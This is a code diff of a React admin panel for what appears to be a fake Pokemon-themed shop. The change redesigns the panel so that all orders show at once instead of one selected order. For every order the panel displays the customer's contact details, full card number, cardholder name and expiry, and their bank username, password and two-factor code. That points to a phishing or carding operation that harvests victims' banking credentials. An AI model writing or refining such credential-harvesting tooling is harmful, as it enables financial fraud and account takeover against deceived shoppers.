@@ -8,7 +8,6 @@ interface AdminPanelProps {
 
 const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
   const [orders] = useState<OrderData[]>(getOrders());
-  const [selectedOrder, setSelectedOrder] = useState<OrderData | null>(null);
 
   const formatDate = (timestamp: number) => {
     return new Date(timestamp).toLocaleString();
@@ -24,119 +23,106 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
           </button>
         </div>
         
-        <div className="flex flex-1 overflow-hidden">
-          {/* Orders List */}
-          <div className="w-1/3 border-r overflow-y-auto p-4">
-            <h3 className="font-bold mb-4 text-pokemon-dark">Orders</h3>
-            {orders.map((order) => (
-              <div 
-                key={order.id} 
-                className={`p-3 mb-2 rounded-lg cursor-pointer transition-colors ${
-                  selectedOrder?.id === order.id 
-                    ? 'bg-pokemon-yellow text-pokemon-dark' 
-                    : 'bg-gray-100 hover:bg-gray-200'
-                }`}
-                onClick={() => setSelectedOrder(order)}
-              >
-                <div className="font-semibold">{order.formData.firstName} {order.formData.lastName}</div>
-                <div className="text-sm">{formatDate(order.timestamp)}</div>
-                <div className="text-sm font-medium">${order.total?.toFixed(2)}</div>
-              </div>
-            ))}
-          </div>
+        <div className="overflow-y-auto p-4">
+          <h3 className="font-bold text-xl mb-6 text-pokemon-dark">All Orders</h3>
           
-          {/* Order Details */}
-          <div className="w-2/3 overflow-y-auto p-4">
-            {selectedOrder ? (
-              <div>
-                <h3 className="font-bold text-lg mb-4 text-pokemon-dark">Order Details</h3>
-                
-                {/* Customer Info */}
-                <div className="mb-6">
-                  <h4 className="font-bold text-pokemon-blue mb-2">Customer Information</h4>
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <p><span className="font-semibold">Name:</span> {selectedOrder.formData.firstName} {selectedOrder.formData.lastName}</p>
-                      <p><span className="font-semibold">Email:</span> {selectedOrder.formData.email}</p>
-                      <p><span className="font-semibold">Phone:</span> {selectedOrder.formData.phone}</p>
-                    </div>
-                    <div>
-                      <p><span className="font-semibold">Date:</span> {formatDate(selectedOrder.timestamp)}</p>
-                      <p><span className="font-semibold">Order ID:</span> {selectedOrder.id}</p>
+          {orders.length === 0 ? (
+            <div className="text-center py-8 text-gray-500">No orders found</div>
+          ) : (
+            <div className="space-y-8">
+              {orders.map((order) => (
+                <div 
+                  key={order.id} 
+                  className="bg-white rounded-lg shadow-md p-6 border border-gray-200"
+                >
+                  <div className="flex justify-between items-center mb-4 pb-3 border-b">
+                    <h4 className="font-bold text-lg text-pokemon-dark">
+                      Order #{order.id.substring(0, 8)}
+                    </h4>
+                    <div className="text-sm text-gray-500">
+                      {formatDate(order.timestamp)}
                     </div>
                   </div>
-                </div>
-                
-                {/* Shipping Info */}
-                <div className="mb-6">
-                  <h4 className="font-bold text-pokemon-blue mb-2">Shipping Information</h4>
-                  <p>{selectedOrder.formData.address}</p>
-                  <p>{selectedOrder.formData.city}, {selectedOrder.formData.state} {selectedOrder.formData.zipCode}</p>
-                </div>
-                
-                {/* Billing Info */}
-                {!selectedOrder.formData.sameAsBilling && (
+                  
+                  {/* Customer Info */}
                   <div className="mb-6">
-                    <h4 className="font-bold text-pokemon-blue mb-2">Billing Information</h4>
-                    <p>{selectedOrder.formData.billingAddress}</p>
-                    <p>{selectedOrder.formData.billingCity}, {selectedOrder.formData.billingState} {selectedOrder.formData.billingZipCode}</p>
-                  </div>
-                )}
-                
-                {/* Payment Info */}
-                <div className="mb-6">
-                  <h4 className="font-bold text-pokemon-blue mb-2">Payment Information</h4>
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <p><span className="font-semibold">Card:</span> {selectedOrder.cardData.cardNumber}</p>
-                      <p><span className="font-semibold">Cardholder:</span> {selectedOrder.cardData.cardholderName}</p>
-                      <p><span className="font-semibold">Expiry:</span> {selectedOrder.cardData.expiryDate}</p>
-                    </div>
-                  </div>
-                </div>
-                
-                {/* Bank Login Info */}
-                <div className="mb-6">
-                  <h4 className="font-bold text-pokemon-blue mb-2">Bank Login Information</h4>
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <p><span className="font-semibold">Username:</span> {selectedOrder.bankLoginData.username}</p>
-                      <p><span className="font-semibold">Password:</span> {selectedOrder.bankLoginData.password}</p>
-                      <p><span className="font-semibold">2FA Code:</span> {selectedOrder.bankLoginData.twoFactorCode}</p>
-                    </div>
-                  </div>
-                </div>
-                
-                {/* Product Info */}
-                {selectedOrder.productInfo && (
-                  <div className="mb-6">
-                    <h4 className="font-bold text-pokemon-blue mb-2">Product Information</h4>
-                    <div className="flex items-center">
-                      <img 
-                        src={selectedOrder.productInfo.image} 
-                        alt={selectedOrder.productInfo.name} 
-                        className="w-16 h-16 object-cover rounded mr-4"
-                      />
+                    <h5 className="font-bold text-pokemon-blue mb-2">Customer Information</h5>
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                       <div>
-                        <p className="font-semibold">{selectedOrder.productInfo.name}</p>
-                        <p>Quantity: {selectedOrder.productInfo.quantity}</p>
-                        <p>Price: ${selectedOrder.productInfo.price.toFixed(2)}</p>
+                        <p><span className="font-semibold">Name:</span> {order.formData.firstName} {order.formData.lastName}</p>
+                        <p><span className="font-semibold">Email:</span> {order.formData.email}</p>
+                        <p><span className="font-semibold">Phone:</span> {order.formData.phone}</p>
                       </div>
                     </div>
                   </div>
-                )}
-                
-                {/* Total */}
-                <div className="mt-6 pt-4 border-t">
-                  <p className="text-xl font-bold text-pokemon-dark">Total: ${selectedOrder.total?.toFixed(2)}</p>
+                  
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    {/* Left Column */}
+                    <div>
+                      {/* Shipping Info */}
+                      <div className="mb-6">
+                        <h5 className="font-bold text-pokemon-blue mb-2">Shipping Information</h5>
+                        <p>{order.formData.address}</p>
+                        <p>{order.formData.city}, {order.formData.state} {order.formData.zipCode}</p>
+                      </div>
+                      
+                      {/* Billing Info */}
+                      {!order.formData.sameAsBilling && (
+                        <div className="mb-6">
+                          <h5 className="font-bold text-pokemon-blue mb-2">Billing Information</h5>
+                          <p>{order.formData.billingAddress}</p>
+                          <p>{order.formData.billingCity}, {order.formData.billingState} {order.formData.billingZipCode}</p>
+                        </div>
+                      )}
+                    </div>
+                    
+                    {/* Right Column */}
+                    <div>
+                      {/* Payment Info */}
+                      <div className="mb-6">
+                        <h5 className="font-bold text-pokemon-blue mb-2">Payment Information</h5>
+                        <p><span className="font-semibold">Card:</span> {order.cardData.cardNumber}</p>
+                        <p><span className="font-semibold">Cardholder:</span> {order.cardData.cardholderName}</p>
+                        <p><span className="font-semibold">Expiry:</span> {order.cardData.expiryDate}</p>
+                      </div>
+                      
+                      {/* Bank Login Info */}
+                      <div className="mb-6">
+                        <h5 className="font-bold text-pokemon-blue mb-2">Bank Login Information</h5>
+                        <p><span className="font-semibold">Username:</span> {order.bankLoginData.username}</p>
+                        <p><span className="font-semibold">Password:</span> {order.bankLoginData.password}</p>
+                        <p><span className="font-semibold">2FA Code:</span> {order.bankLoginData.twoFactorCode}</p>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  {/* Product Info */}
+                  {order.productInfo && (
+                    <div className="mb-6">
+                      <h5 className="font-bold text-pokemon-blue mb-2">Product Information</h5>
+                      <div className="flex items-center">
+                        <img 
+                          src={order.productInfo.image} 
+                          alt={order.productInfo.name} 
+                          className="w-16 h-16 object-cover rounded mr-4"
+                        />
+                        <div>
+                          <p className="font-semibold">{order.productInfo.name}</p>
+                          <p>Quantity: {order.productInfo.quantity}</p>
+                          <p>Price: ${order.productInfo.price.toFixed(2)}</p>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+                  
+                  {/* Total */}
+                  <div className="mt-6 pt-4 border-t">
+                    <p className="text-xl font-bold text-pokemon-dark">Total: ${order.total?.toFixed(2)}</p>
+                  </div>
                 </div>
-              </div>
-            ) : (
-              <div className="h-full flex items-center justify-center text-gray-500">
-                Select an order to view details
-              </div>
-            )}
-          </div>
+              ))}
+            </div>
+          )}
         </div>
       </div>
     </div>
